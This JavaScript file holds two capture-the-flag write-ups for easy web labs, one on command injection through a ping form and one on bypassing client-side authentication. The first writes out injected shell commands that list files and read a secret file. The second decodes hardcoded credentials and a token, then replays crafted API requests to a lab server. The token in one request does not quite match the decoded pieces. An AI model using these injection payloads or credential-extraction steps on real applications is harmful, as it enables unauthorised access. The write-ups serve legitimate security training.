export const writeups = [
  {
    id: "ctf-name-challenge-1",
    title: "Practical Scenario - Command Injection",
    ctf: "SECPlayground x SWU 2026",
    category: "Web",
    difficulty: "Easy",
    year: "2026",
    summary: "simple command injection challenge.",
    content: `
## Overview

NetDiag Pro is a web-based network diagnostic tool used by IT administrators. The application provides a ping utility to test network connectivity. Your security assessment has identified potential input validation issues. Investigate the application and determine if it's vulnerable to command injection attacks..

## Reconnaissance

Ofcourse we start with view page source and the first flag is there.

\`\`\`
flag1{n3tw0rk_t00l_d1sc0v3r3d}
\`\`\`

and since this is a simple challenge we can just try to inject some commands in the input field and see if we can get a response.

## Finding the Vulnerability

we can see that the application is not properly sanitizing user input so we ping an address while injecting payload.

\`\`\`
localhost; ls
\`\`\`
 
which return the list of files in the current directory, confirming that the application is vulnerable to command injection.

\`\`\`
PING localhost (127.0.0.1) 56(84) bytes of data.
64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.032 ms
64 bytes from localhost (127.0.0.1): icmp_seq=2 ttl=64 time=0.031 ms
64 bytes from localhost (127.0.0.1): icmp_seq=3 ttl=64 time=0.033 ms

--- localhost ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2072ms
rtt min/avg/max/mdev = 0.031/0.032/0.033/0.000 ms
Dockerfile
__MACOSX
app.py
entrypoint.sh
exploit.py
readme.md
requirements.txt
solution.md
\`\`\`

## Exploitation

we cat solution.md and we get the flag.

\`\`\`
flag2{c0mm4nd_1nj3ct10n_w0rks}
\`\`\`

Following the instructions in solution.md we cat the secret file and we get the final flag.

\`\`\`
localhost; cat /secret/flag.txt

PING localhost (127.0.0.1) 56(84) bytes of data.
64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.022 ms
64 bytes from localhost (127.0.0.1): icmp_seq=2 ttl=64 time=0.048 ms
64 bytes from localhost (127.0.0.1): icmp_seq=3 ttl=64 time=0.037 ms

--- localhost ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2079ms
rtt min/avg/max/mdev = 0.022/0.035/0.048/0.010 ms
web{UyCT7MzwDn}
\`\`\`

## Flags

\`\`\`
flag1{n3tw0rk_t00l_d1sc0v3r3d}
flag2{c0mm4nd_1nj3ct10n_w0rks}
web{UyCT7MzwDn}
\`\`\`

## What I Learned

this challenge taught me about the importance of input validation and the dangers of command injection vulnerabilities.
    `.trim(),
  },
  {
    id: "ctf-name-challenge-2",
    title: "Practical Scenario - Javascript Bypass",
    ctf: "SECPlayground x SWU 2026",
    category: "Web",
    difficulty: "Easy",
    year: "2026",
    summary: "Simple Javascript bypass challenge.",
    content: `
## Overview

CyberVault Inc. has deployed a web application with a login system. However, rumors suggest that the authentication mechanism has significant flaws. Your mission is to analyze the application, find security weaknesses, and gain unauthorized access..


## Reconnaissance

just like the previous challenge we start with view page source and the first flag is right there.

\`\`\`
flag1{j4v4scr1pt_s0urc3_3xp0s3d}
\`\`\`

scrolling further down we see leftover code from development which is a hint that the application is vulnerable to javascript bypass.

\`\`\`
// CyberVault Authentication Module v3.2
    // TODO: remove hardcoded test creds before production
    // test account: admin / CyberVault2026!

    // Production credentials (XOR-encoded, key=0x5A)
    var _0xc9 = 0x5A;
    var _0xa1 = [41,63,57,59,62,55,51,52];
    var _0xa2 = [57,54,107,105,52,46,9,107,62,105,10,26,41,41];
    function _0xd(a,k){return a.map(function(c){return String.fromCharCode(c^k)}).join('')}

    // Vault service configuration (base64)
    var _0xep = 'L2FwaS9hdXRo';
    var _0xhdr = 'WC1WYXVsdC1Ub2tlbg==';
    var _0xt1 = 'dmF1bHRfczNjcjN0';
    var _0xt2 = 'X2szeTIwMjY=';
\`\`\`

## Finding the Vulnerability

the hardcoded test creds are a clear indication that the application is vulnerable to javascript bypass, we can just use the test creds to login and get the flag.
we can also decode the production credentials using the provided XOR function and key in the console to get the actual credentials.

\`\`\`
_0xd(_0xa1,_0xc9)
"secadmin"
_0xd(_0xa2,_0xc9)
"cl13ntS1d3P@ss" 
\`\`\`

when logged in with the test creds we get the second flag.

\`\`\`
flag2{cl13nt_s1d3_4uth_byp4ss3d}
\`\`\`

next we notice that the vault service configuration is base64 encoded, we can decode it to get the API endpoint and the required headers for authentication.

\`\`\`
atob(_0xep)
"/api/auth"
atob(_0xhdr)
"X-Vault-Token"
atob(_0xt1)
"vault_s3cr3t"
atob(_0xt2)
"_k32026"
\`\`\`

## Exploitation

we can use the decoded credentials and the API endpoint to authenticate and get the final flag.

using burp suite we can send a POST request to the API endpoint with the required headers and the decoded credentials in the body to get the final flag.

\`\`\`
POST /api/auth HTTP/1.1
Host: 34.158.33.63
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
\`\`\`

and the response came back with:

\`\`\`
HTTP/1.1 401 Unauthorized
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 69
ETag: W/"45-9Tx78ZPKzWMdCeG4iLpfPRv/QUc"
Date: Mon, 27 Apr 2026 10:26:38 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"status":"error","message":"Missing required header: X-Vault-Token"}
\`\`\`

we can see that the response is asking for the X-Vault-Token header, we can add the required header with the decoded token and resend the request to get the final flag.

\`\`\`
POST /api/auth HTTP/1.1
Host: 34.158.33.63
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
X-Vault-Token: vault_s3cr3t_k3y2026
Connection: keep-alive
\`\`\`

and the response came back with this:

\`\`\`
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 174
ETag: W/"ae-L1r0UnQFSk6K2rCxw+its0OZ+QQ"
Date: Mon, 27 Apr 2026 10:30:23 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"status":"authenticated","access_token":"df6179a6c3952c874f9c997fe9bf41e9857b35d9dbcf1515fde78808fae118ec","next":"GET /api/vault with Authorization: Bearer <access_token>"}
\`\`\`

we can see that we are authenticated and we have an access token, we can use this token to access the vault and get the final flag.

\`\`\`
GET /api/vault HTTP/1.1
Host: 34.158.33.63
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Authorization: Bearer df6179a6c3952c874f9c997fe9bf41e9857b35d9dbcf1515fde78808fae118ec
Connection: keep-alive
\`\`\`

and the response came back with the final flag.

\`\`\`
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 85
ETag: W/"55-bqmtNOV7h+wiDbKq6qcExDaB1is"
Date: Mon, 27 Apr 2026 10:31:14 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"status":"success","message":"You found the hidden vault!","flag":"web{9VvMLw0kXX}"}
\`\`\`

## Flags

\`\`\`
flag1{j4v4scr1pt_s0urc3_3xp0s3d}
flag2{cl13nt_s1d3_4uth_byp4ss3d}
web{9VvMLw0kXX}
\`\`\`

## What I Learned

this challenge taught me about the importance of client-side security and the dangers of leaving sensitive information in the source code.

`.trim(),
  },
];

// difficulty options: "easy" | "medium" | "hard"
// category options: "Web" | "Crypto" | "Pwn" | "Reverse" | "Forensics" | "Misc" | "OSINT"
